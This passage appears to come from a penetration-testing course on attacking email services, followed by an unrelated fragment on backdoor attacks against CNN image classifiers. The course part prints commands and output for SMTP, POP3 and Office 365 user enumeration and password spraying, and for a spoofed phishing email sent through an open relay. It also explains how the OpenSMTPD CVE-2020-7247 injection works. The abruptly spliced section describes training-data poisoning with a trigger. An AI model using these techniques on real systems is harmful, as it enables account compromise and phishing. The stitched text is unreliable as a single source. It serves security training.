Trying <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.20</span>...
Connected to <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.20</span>.
Escape character is '^]'.
<span class="hljs-number">220</span> parrot ESMTP Postfix (Debian/GNU)


EXPN john

<span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.0</span> john@inlanefreight.htb


EXPN support-team

<span class="hljs-number">250</span> <span class="hljs-number">2.0</span><span class="hljs-number">.0</span> carol@inlanefreight.htb
<span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.5</span> elisa@inlanefreight.htb
</code></pre>
<p><code>RCPT TO</code> identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.</p>
<p><strong>RCPT TO Command</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ telnet <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.20</span> <span class="hljs-number">25</span>

Trying <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.20</span>...
Connected to <span class="hljs-number">10.10</span><span class="hljs-meta">.110</span><span class="hljs-meta">.20</span>.
Escape character is <span class="hljs-string">'^]'</span>.
<span class="hljs-number">220</span> parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:<span class="hljs-keyword">test</span>@htb.com
it is
<span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-meta">.0</span> <span class="hljs-keyword">test</span>@htb.com... Sender ok


RCPT TO:julio

<span class="hljs-number">550</span> <span class="hljs-number">5.1</span><span class="hljs-meta">.1</span> julio... User unknown


RCPT TO:kate

<span class="hljs-number">550</span> <span class="hljs-number">5.1</span><span class="hljs-meta">.1</span> kate... User unknown


RCPT TO:john

<span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-meta">.5</span> john... Recipient ok
</code></pre>
<p>We can also use the <code>POP3</code> protocol to enumerate users depending on the service implementation. For example, we can use the command <code>USER</code> followed by the username, and if the server responds <code>OK</code>. This means that the user exists on the server.</p>
<p><strong>USER Command</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ telnet <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.20</span> <span class="hljs-number">110</span>

Trying <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.20</span>...
Connected to <span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.20</span>.
Escape character is '^]'.
+OK POP3 Server ready

USER julio

-ERR


USER john

+OK
</code></pre>
<p>To automate our enumeration process, we can use a tool named <a href="https://github.com/pentestmonkey/smtp-user-enum">smtp-user-enum</a>. We can specify the enumeration mode with the argument <code>-M</code> followed by <code>VRFY</code>, <code>EXPN</code>, or <code>RCPT</code>, and the argument <code>-U</code> with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument <code>-D</code>. Finally, we specify the target with the argument <code>-t</code>.</p>
<pre><code class="lang-shell-session">[!bash!]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t <span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.7</span>

Starting smtp-user-enum v1<span class="hljs-number">.2</span> ( http:<span class="hljs-comment">//pentestmonkey.net/tools/smtp-user-enum )</span>

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... <span class="hljs-number">5</span>
Usernames file ........... userlist.txt
Target count ............. <span class="hljs-number">1</span>
Username count ........... <span class="hljs-number">78</span>
Target TCP port .......... <span class="hljs-number">25</span>
Query timeout ............ <span class="hljs-number">5</span> secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr <span class="hljs-number">21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">07</span> <span class="hljs-number">2022</span> #########
<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.7</span>: jose@inlanefreight.htb exists
<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.7</span>: pedro@inlanefreight.htb exists
<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.7</span>: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr <span class="hljs-number">21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">18</span> <span class="hljs-number">2022</span> #########
<span class="hljs-number">3</span> results.

<span class="hljs-number">78</span> queries <span class="hljs-keyword">in</span> <span class="hljs-number">11</span> seconds (<span class="hljs-number">7.1</span> queries / sec)
</code></pre>
<hr>
<h3 id="cloud-enumeration">Cloud Enumeration</h3>
<p>As discussed, cloud service providers use their own implementation for email services. Those services commonly have custom features that we can abuse for operation, such as username enumeration. Let&#39;s use Office 365 as an example and explore how we can enumerate usernames in this cloud platform.</p>
<p><a href="https://github.com/0xZDH/o365spray">O365spray</a> is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365) developed by <a href="https://twitter.com/0xzdh">ZDH</a>. This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in <a href="https://github.com/0xZDH/o365spray#Acknowledgments">Acknowledgments</a>. Let&#39;s first validate if our target domain is using Office 365.</p>
<p><strong>O365 Spray</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ python3 o365spray.py <span class="hljs-comment">--validate --domain msplaintext.xyz</span>

            *** O365 Spray ***            

&gt;<span class="hljs-comment">----------------------------------------&lt;</span>

   &gt; version        :  2.0.4
   &gt; domain         :  <span class="hljs-type">msplaintext.xyz</span>
   &gt; validate       :  <span class="hljs-type">True</span>
   &gt; timeout        :  25 <span class="hljs-type">seconds</span>
   &gt; start          :  2022-04-13 09:46:40

&gt;<span class="hljs-comment">----------------------------------------&lt;</span>

[<span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">46</span>:<span class="hljs-number">40</span>,<span class="hljs-number">344</span>] INFO : <span class="hljs-type">Running</span> O365 validation <span class="hljs-keyword">for</span>: msplaintext.xyz
[<span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">46</span>:<span class="hljs-number">40</span>,<span class="hljs-number">743</span>] INFO : [<span class="hljs-type">VALID</span>] The following domain <span class="hljs-keyword">is</span> using O365: msplaintext.xyz
</code></pre>
<p>Now, we can attempt to identify usernames.</p>
<pre><code class="lang-shell-session">[!bash!]$ python3 o365spray.py <span class="hljs-comment">--enum -U users.txt --domain msplaintext.xyz        </span>

            *** O365 Spray ***             

&gt;<span class="hljs-comment">----------------------------------------&lt;</span>

   &gt; version        :  2.0.4
   &gt; domain         :  <span class="hljs-type">msplaintext.xyz</span>
   &gt; enum           :  <span class="hljs-type">True</span>
   &gt; userfile       :  <span class="hljs-type">users.txt</span>
   &gt; enum_module    :  <span class="hljs-type">office</span>
   &gt; rate           :  10 <span class="hljs-type">threads</span>
   &gt; timeout        :  25 <span class="hljs-type">seconds</span>
   &gt; start          :  2022-04-13 09:48:03

&gt;<span class="hljs-comment">----------------------------------------&lt;</span>

[<span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">48</span>:<span class="hljs-number">03</span>,<span class="hljs-number">621</span>] INFO : <span class="hljs-type">Running</span> O365 validation <span class="hljs-keyword">for</span>: msplaintext.xyz
[<span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">48</span>:<span class="hljs-number">04</span>,<span class="hljs-number">062</span>] INFO : [<span class="hljs-type">VALID</span>] The following domain <span class="hljs-keyword">is</span> using O365: msplaintext.xyz
[<span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">48</span>:<span class="hljs-number">04</span>,<span class="hljs-number">064</span>] INFO : <span class="hljs-type">Running</span> user enumeration against <span class="hljs-number">67</span> potential users
[<span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">48</span>:<span class="hljs-number">08</span>,<span class="hljs-number">244</span>] INFO : [<span class="hljs-type">VALID</span>] lewen@msplaintext.xyz
[<span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">48</span>:<span class="hljs-number">10</span>,<span class="hljs-number">415</span>] INFO : [<span class="hljs-type">VALID</span>] juurena@msplaintext.xyz
[<span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">48</span>:<span class="hljs-number">10</span>,<span class="hljs-number">415</span>] INFO : 

[ * ] <span class="hljs-type">Valid</span> accounts can be found <span class="hljs-keyword">at</span>: '/opt/o365spray/enum/enum_valid_accounts.<span class="hljs-number">2204130948</span>.txt'
[ * ] <span class="hljs-keyword">All</span> enumerated accounts can be found <span class="hljs-keyword">at</span>: '/opt/o365spray/enum/enum_tested_accounts.<span class="hljs-number">2204130948</span>.txt'

[<span class="hljs-number">2022</span>-<span class="hljs-number">04</span>-<span class="hljs-number">13</span> <span class="hljs-number">09</span>:<span class="hljs-number">48</span>:<span class="hljs-number">10</span>,<span class="hljs-number">416</span>] INFO : <span class="hljs-type">Valid</span> Accounts: <span class="hljs-number">2</span>
</code></pre>
<hr>
<h3 id="password-attacks">Password Attacks</h3>
<p>We can use <code>Hydra</code> to perform a password spray or brute force against email services such as <code>SMTP</code>, <code>POP3</code>, or <code>IMAP4</code>. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for <code>POP3</code>.</p>
<p><strong>Hydra - Password Attack</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** <span class="hljs-keyword">ignore</span> laws <span class="hljs-keyword">and</span> ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) <span class="hljs-keyword">starting</span> <span class="hljs-keyword">at</span> <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-13</span> <span class="hljs-number">11</span>:<span class="hljs-number">37</span>:<span class="hljs-number">46</span>
[INFO] several providers have implemented cracking <span class="hljs-keyword">protection</span>, <span class="hljs-keyword">check</span> <span class="hljs-keyword">with</span> a small wordlist <span class="hljs-keyword">first</span> - <span class="hljs-keyword">and</span> stay legal!
[<span class="hljs-keyword">DATA</span>] <span class="hljs-keyword">max</span> <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">67</span> login tries (l:<span class="hljs-number">67</span>/p:<span class="hljs-number">1</span>), ~<span class="hljs-number">5</span> tries per task
[<span class="hljs-keyword">DATA</span>] attacking pop3://<span class="hljs-number">10.10</span><span class="hljs-number">.110</span><span class="hljs-number">.20</span>:<span class="hljs-number">110</span>/
[<span class="hljs-number">110</span>][pop3] host: <span class="hljs-number">10.129</span><span class="hljs-number">.42</span><span class="hljs-number">.197</span>   login: john   <span class="hljs-keyword">password</span>: Company01!
<span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid <span class="hljs-keyword">password</span> <span class="hljs-keyword">found</span>
</code></pre>
<p>If cloud services support SMTP, POP3, or IMAP4 protocols, we may be able to attempt to perform password spray using tools like <code>Hydra</code>, but these tools are usually blocked. We can instead try to use custom tools such as <a href="https://github.com/0xZDH/o365spray">o365spray</a> or <a href="https://github.com/dafthack/MailSniper">MailSniper</a> for Microsoft Office 365 or <a href="https://github.com/ustayready/CredKing">CredKing</a> for Gmail or Okta. Keep in mind that these tools need to be up-to-date because if the service provider changes something (which happens often), the tools may not work anymore. This is a perfect example of why we must understand what our tools are doing and have the know-how to modify them if they do not work properly for some reason.</p>
<p><strong>O365 Spray - Password Spraying</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ python3 o365spray.py --spray -U usersfound.txt -p <span class="hljs-string">'March2022!'</span> --count <span class="hljs-number">1</span> --lockout <span class="hljs-number">1</span> --domain msplaintext.xyz

            *** O365 Spray ***            

&gt;----------------------------------------&lt;

   &gt; <span class="hljs-string">version        :</span>  <span class="hljs-number">2.0</span><span class="hljs-number">.4</span>
   &gt; <span class="hljs-string">domain         :</span>  msplaintext.xyz
   &gt; <span class="hljs-string">spray          :</span>  True
   &gt; <span class="hljs-string">password       :</span>  March2022!
   &gt; <span class="hljs-string">userfile       :</span>  usersfound.txt
   &gt; <span class="hljs-string">count          :</span>  <span class="hljs-number">1</span> passwords/spray
   &gt; <span class="hljs-string">lockout        :</span>  <span class="hljs-number">1.0</span> minutes
   &gt; <span class="hljs-string">spray_module   :</span>  oauth2
   &gt; <span class="hljs-string">rate           :</span>  <span class="hljs-number">10</span> threads
   &gt; <span class="hljs-string">safe           :</span>  <span class="hljs-number">10</span> locked accounts
   &gt; <span class="hljs-string">timeout        :</span>  <span class="hljs-number">25</span> seconds
   &gt; <span class="hljs-string">start          :</span>  <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-14</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">31</span>

&gt;----------------------------------------&lt;

[<span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-14</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">31</span>,<span class="hljs-number">757</span>] <span class="hljs-string">INFO :</span> Running O365 validation <span class="hljs-string">for:</span> msplaintext.xyz
[<span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-14</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">32</span>,<span class="hljs-number">201</span>] <span class="hljs-string">INFO :</span> [VALID] The following domain is using <span class="hljs-string">O365:</span> msplaintext.xyz
[<span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-14</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">32</span>,<span class="hljs-number">202</span>] <span class="hljs-string">INFO :</span> Running password spray against <span class="hljs-number">2</span> users.
[<span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-14</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">32</span>,<span class="hljs-number">202</span>] <span class="hljs-string">INFO :</span> Password spraying the following <span class="hljs-string">passwords:</span> [<span class="hljs-string">'March2022!'</span>]
[<span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-14</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">33</span>,<span class="hljs-number">025</span>] <span class="hljs-string">INFO :</span> [VALID] lewen<span class="hljs-meta">@msplaintext</span>.<span class="hljs-string">xyz:</span>March2022!
[<span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-14</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">33</span>,<span class="hljs-number">048</span>] <span class="hljs-string">INFO :</span> 

[ * ] Writing valid credentials <span class="hljs-string">to:</span> <span class="hljs-string">'/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'</span>
[ * ] All sprayed credentials can be found <span class="hljs-string">at:</span> <span class="hljs-string">'/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'</span>

[<span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-14</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">33</span>,<span class="hljs-number">048</span>] <span class="hljs-string">INFO :</span> Valid <span class="hljs-string">Credentials:</span> <span class="hljs-number">1</span>
</code></pre>
<hr>
<h3 id="protocol-specifics-attacks">Protocol Specifics Attacks</h3>
<p>An open relay is a Simple Transfer Mail Protocol (<code>SMTP</code>) server, which is improperly configured and allows an unauthenticated email relay. Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. This behavior masks the source of the messages and makes it look like the mail originated from the open relay server.</p>
<p><strong>Open Relay</strong></p>
<p>From an attacker&#39;s standpoint, we can abuse this for phishing by sending emails as non-existing users or spoofing someone else&#39;s email. For example, imagine we are targeting an enterprise with an open relay mail server, and we identify they use a specific email address to send notifications to their employees. We can send a similar email using the same address and add our phishing link with this information. With the <code>nmap smtp-open-relay</code> script, we can identify if an SMTP port allows an open relay.</p>
<pre><code class="lang-shell-session">[!bash!]# <span class="hljs-keyword">nmap</span> -p25 -Pn --script smtp-<span class="hljs-keyword">open</span>-relay <span class="hljs-number">10.10</span>.<span class="hljs-number">11.213</span>

Starting Nmap <span class="hljs-number">7.80</span> ( http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2020</span>-<span class="hljs-number">10</span>-<span class="hljs-number">28</span> <span class="hljs-number">23</span>:<span class="hljs-number">59</span> EDT
Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">11.213</span>
Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.28</span>s latency).

PORT   STATE SERVICE
<span class="hljs-number">25</span>/tcp <span class="hljs-keyword">open</span>  smtp
|_smtp-<span class="hljs-keyword">open</span>-relay: Server <span class="hljs-keyword">is</span> <span class="hljs-keyword">an</span> <span class="hljs-keyword">open</span> relay (<span class="hljs-number">14</span>/<span class="hljs-number">16</span> tests)
</code></pre>
<p>Next, we can use any mail client to connect to the mail server and send our email.</p>
<pre><code class="lang-shell-session">[!bash!]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213

=<span class="ruby">== Trying <span class="hljs-number">10.10</span>.<span class="hljs-number">11.213</span><span class="hljs-symbol">:</span><span class="hljs-number">25</span>...
</span>=<span class="ruby">== Connected to <span class="hljs-number">10.10</span>.<span class="hljs-number">11.213</span>.
</span>&lt;-  220 mail.localdomain SMTP Mailer ready
 -<span class="ruby">&gt; EHLO parrot
</span>&lt;-  250-mail.localdomain
&lt;-  250-SIZE 33554432
&lt;-  250-8BITMIME
&lt;-  250-STARTTLS
&lt;-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
&lt;-  250 HELP
 -<span class="ruby">&gt; MAIL <span class="hljs-symbol">FROM:</span>&lt;notifications@inlanefreight.com&gt;
</span>&lt;-  250 OK
 -<span class="ruby">&gt; RCPT <span class="hljs-symbol">TO:</span>&lt;employees@inlanefreight.com&gt;
</span>&lt;-  250 OK
 -<span class="ruby">&gt; DATA
</span>&lt;-  354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
 -<span class="ruby">&gt; <span class="hljs-symbol">Date:</span> Thu, <span class="hljs-number">29</span> Oct <span class="hljs-number">2020</span> <span class="hljs-number">01</span><span class="hljs-symbol">:</span><span class="hljs-number">36</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span> -<span class="hljs-number">0400</span>
</span> -<span class="ruby">&gt; <span class="hljs-symbol">To:</span> employees@inlanefreight.com
</span> -<span class="ruby">&gt; <span class="hljs-symbol">From:</span> notifications@inlanefreight.com
</span> -<span class="ruby">&gt; <span class="hljs-symbol">Subject:</span> Company Notification
</span> -<span class="ruby">&gt; Message-<span class="hljs-symbol">Id:</span> &lt;<span class="hljs-number">20201029013606.775675</span>@parrot&gt;
</span> -<span class="ruby">&gt; X-<span class="hljs-symbol">Mailer:</span> swaks v20190914.<span class="hljs-number">0</span> jetmore.org/john/code/swaks/
</span> -<span class="ruby">&gt; 
</span> -<span class="ruby">&gt; Hi All, we want to hear from you! Please complete the following survey. <span class="hljs-symbol">http:</span>/<span class="hljs-regexp">/mycustomphishinglink.com/</span>
</span> -<span class="ruby">&gt; 
</span> -<span class="ruby">&gt; 
</span> -<span class="ruby">&gt; .
</span>&lt;-  250 OK
 -<span class="ruby">&gt; QUIT
</span>&lt;-  221 Bye
=<span class="ruby">== Connection closed with remote host.</span>
</code></pre>
<h2 id="latest-email-service-vulnerabilities">Latest Email Service Vulnerabilities</h2>
<hr>
<p>One of the most recent publicly disclosed and dangerous <a href="https://en.wikipedia.org/wiki/Simple\_Mail\_Transfer\_Protocol">Simple Mail Transfer Protocol (SMTP)</a> vulnerabilities was discovered in <a href="https://www.opensmtpd.org/">OpenSMTPD</a> up to version 6.6.2 service was in 2020. This vulnerability was assigned <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7247">CVE-2020-7247</a> and leads to RCE. It has been exploitable since 2018. This service has been used in many different Linux distributions, such as Debian, Fedora, FreeBSD, and others. The dangerous thing about this vulnerability is the possibility of executing system commands remotely on the system and that exploiting this vulnerability does not require authentication.</p>
<p>According to <a href="https://www.shodan.io/">Shodan.io</a>, at the time of writing (April 2022), there are over 5,000 publicly accessible OpenSMTPD servers worldwide, and the trend is growing. However, this does not mean that this vulnerability affects every service. Instead, we want to show you how significant the impact of an RCE would be in case this vulnerability were discovered now. However, of course, this applies to all other services as well.</p>
<p><strong>Shodan Search</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/opensmtpd.png" alt=""></p>
<p><strong>Shodan Trend</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/opensmtpd\_trend.png" alt=""></p>
<hr>
<h3 id="the-concept-of-the-attack">The Concept of the Attack</h3>
<p>As we already know, with the SMTP service, we can compose emails and send them to desired people. The vulnerability in this service lies in the program&#39;s code, namely in the function that records the sender&#39;s email address. This offers the possibility of escaping the function using a semicolon (<code>;</code>) and making the system execute arbitrary shell commands. However, there is a limit of 64 characters, which can be inserted as a command. The technical details of this vulnerability can be found <a href="https://www.openwall.com/lists/oss-security/2020/01/28/3">here</a>.</p>
<p><strong>The Concept of Attacks</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/attack\_concept2.png" alt=""></p>
<p>Here we need to initialize a connection with the SMTP service first. This can be automated by a script or entered manually. After the connection is established, an email must be composed in which we define the sender, the recipient, and the actual message for the recipient. The desired system command is inserted in the sender field connected to the sender address with a semicolon (<code>;</code>). As soon as we finish writing, the data entered is processed by the OpenSMTPD process.</p>
<p><strong>Initiation of the Attack</strong></p>
<table data-header-hidden><thead><tr><th width="98"></th><th width="334"></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>Remote Code Execution</strong></td><td><strong>Concept of Attacks - Category</strong></td></tr><tr><td><code>1.</code></td><td>The source is the user input that can be entered manually or automated during direct interaction with the service.</td><td><code>Source</code></td></tr><tr><td><code>2.</code></td><td>The service will take the email with the required information.</td><td><code>Process</code></td></tr><tr><td><code>3.</code></td><td>Listening to the standardized ports of a system requires <code>root</code> privileges on the system, and if these ports are used, the service runs accordingly with elevated privileges.</td><td><code>Privileges</code></td></tr><tr><td><code>4.</code></td><td>As the destination, the entered information is forwarded to another local process.</td><td><code>Destination</code></td></tr></tbody></table>

<p>This is when the cycle starts all over again, but this time to gain remote access to the target system.</p>
<p><strong>Trigger Remote Code Execution</strong></p>
<table data-header-hidden><thead><tr><th width="94"></th><th width="329"></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>Remote Code Execution</strong></td><td><strong>Concept of Attacks - Category</strong></td></tr><tr><td><code>5.</code></td><td>This time, the source is the entire input, especially from the sender area, which contains our system command.</td><td><code>Source</code></td></tr><tr><td><code>6.</code></td><td>The process reads all the information, and the semicolon (<code>;</code>) interrupts the reading due to special rules in the source code that leads to the execution of the entered system command.</td><td><code>Process</code></td></tr><tr><td><code>7.</code></td><td>Since the service is already running with elevated privileges, other processes of OpenSMTPD will be executed with the same privileges. With these, the system command we entered will also be executed.</td><td><code>Privileges</code></td></tr><tr><td><code>8.</code></td><td>The destination for the system command can be, for example, the network back to our host through which we get access to the system.</td><td><code>Destination</code></td></tr></tbody></table>

<p>An <a href="https://www.exploit-db.com/exploits/47984">exploit</a> has been published on the <a href="https://www.exploit-db.com/">Exploit-DB</a> platform for this vulnerability which can be used for more detailed analysis and the functionality of the trigger for the execution of system commands.</p>
<hr>
<h3 id="next-steps">Next Steps</h3>
<p>As we&#39;ve seen, email attacks can lead to sensitive data disclosure through direct access to a user&#39;s inbox or by combining a misconfiguration with a convincing phishing email. There are other ways to attack email services that can be very effective as well. A few Hack The Box boxes demonstrate email attacks, such as <a href="https://www.youtube.com/watch?v=5nnJq\_IWJog">Rabbit</a>, which deals with brute-forcing Outlook Web Access (OWA) and then sending a document with a malicious macro to phish a user, <a href="https://0xdf.gitlab.io/2020/11/28/htb-sneakymailer.html">SneakyMailer</a> which has elements of phishing and enumerating a user&#39;s inbox using Netcat and an IMAP client, and <a href="https://0xdf.gitlab.io/2018/11/10/htb-reel.html">Reel</a> which dealt with brute-forcing SMTP users and phishing with a malicious RTF file.</p>
<p>It&#39;s worth playing these boxes, or at least watching the Ippsec video or reading a walkthrough to see examples of these attacks in action. This goes for any attack demonstrated in this module (or others). The site <a href="https://ippsec.rocks/?">ippsec.rocks</a> can be used to search for common terms and will show which HTB boxes these appear in, which will reveal a wealth of targets to practice against.</p>



<h1>The CNN Model Architecture</h1>
<hr/>

<p>Before building the model, lets review the underlying process being manipulated by the attack. In standard supervised learning, as we have done three times now, we train a model, represented as 
  <math display="inline">
    <semantics>
      <mrow><mi>f</mi><mo>(</mo><mi>X</mi><mo>;</mo><mi>W</mi><mo>)</mo></mrow>
      <annotation encoding="application/x-tex">f(X; W)</annotation>
    </semantics>
  </math>, with parameters 
  <math display="inline">
    <semantics><mi>W</mi><annotation encoding="application/x-tex">W</annotation></semantics>
  </math>, using a clean dataset 
  <math display="inline">
    <semantics>
      <mrow><msub><mi>D</mi><mi>clean</mi></msub><mo>=</mo><mo>{</mo><mrow><mi>(</mi><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><msub><mi>y</mi><mi>i</mi></msub><mi>)</mi></mrow><mo>}</mo></mrow>
      <annotation encoding="application/x-tex">D_{clean} = \{(x_i, y_i)\}</annotation>
    </semantics>
  </math>.</p>

<p>The goal is to find the optimal weights 
  <math display="inline">
    <semantics><msup><mi>W</mi><mo>*</mo></msup><annotation encoding="application/x-tex">W^*</annotation></semantics>
  </math> that minimize a loss function 
  <math display="inline">
    <semantics><mi>L</mi><annotation encoding="application/x-tex">L</annotation></semantics>
  </math>, averaged over all data points:</p>

<p>
  <math display="block">
    <semantics>
      <mrow>
        <msup><mi>W</mi><mo>*</mo></msup><mo>=</mo>
        <mi>argmin</mi><mo>_</mo><mi>W</mi>
        <mfrac><mn>1</mn><mrow><mo>|</mo><msub><mi>D</mi><mi>clean</mi></msub><mo>|</mo></mrow></mfrac>
        <mo></mo><mrow><mo>(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>,</mo><msub><mi>y</mi><mi>i</mi></msub><mo>)</mo><msub><mi>D</mi><mi>clean</mi></msub></mrow>
        <mi>L</mi><mo>(</mo><mi>f</mi><mo>(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>;</mo><mi>W</mi><mo>)</mo><mo>,</mo><msub><mi>y</mi><mi>i</mi></msub><mo>)</mo>
      </mrow>
      <annotation encoding="application/x-tex">
        W^{*} = \arg\min_{W}\frac{1}{|D_{clean}|}\sum_{(x_i,y_i)\in D_{clean}}L(f(x_i;W),y_i)
      </annotation>
    </semantics>
  </math>
</p>

<p>This optimization guides the model <math display="inline"><semantics><mi>f</mi><annotation encoding="application/x-tex">f</annotation></semantics></math> to learn features and decision boundaries that accurately map clean inputs <math display="inline"><semantics><msub><mi>x</mi><mi>i</mi></msub><annotation encoding="application/x-tex">x_i</annotation></semantics></math> to their correct labels <math display="inline"><semantics><msub><mi>y</mi><mi>i</mi></msub><annotation encoding="application/x-tex">y_i</annotation></semantics></math>.</p>

<h2> Trojan (Backdoor) Attack</h2>


<p>A Trojan attack corrupts this process by altering the training data:</p>
<ol>
  <li>Select samples from a <strong>source class</strong>: 
    <math display="inline">
      <semantics>
        <mrow><msub><mi>D</mi><mi>source_subset</mi></msub><mo></mo><msub><mi>D</mi><mi>clean</mi></msub></mrow>
        <annotation encoding="application/x-tex">D_{source\_subset}  D_{clean}</annotation>
      </semantics>
    </math>.
  </li>
  <li>Create poisoned samples:
    <math display="inline">
      <semantics>
        <mrow><msub><mi>D</mi><mi>poison</mi></msub><mo>=</mo><mo>{</mo><mrow><mi>(</mi><mi>T</mi><mo>(</mo><msub><mi>x</mi><mi>j</mi></msub><mo>)</mo><mo>,</mo><msub><mi>y</mi><mi>target</mi></msub><mi>)</mi><mo>|</mo><mo>(</mo><msub><mi>x</mi><mi>j</mi></msub><mo>,</mo><msub><mi>y</mi><mi>source</mi></msub><mo>)</mo><msub><mi>D</mi><mi>source_subset</mi></msub></mrow><mo>}</mo></mrow>
        <annotation encoding="application/x-tex">
          D_{poison} = \{(T(x_j), y_{target}) | (x_j, y_{source})  D_{source\_subset}\}
        </annotation>
      </semantics>
    </math>.
    Here, <code>T()</code> applies the trigger and <code>y<sub>target</sub></code> is the chosen incorrect label.
  </li>
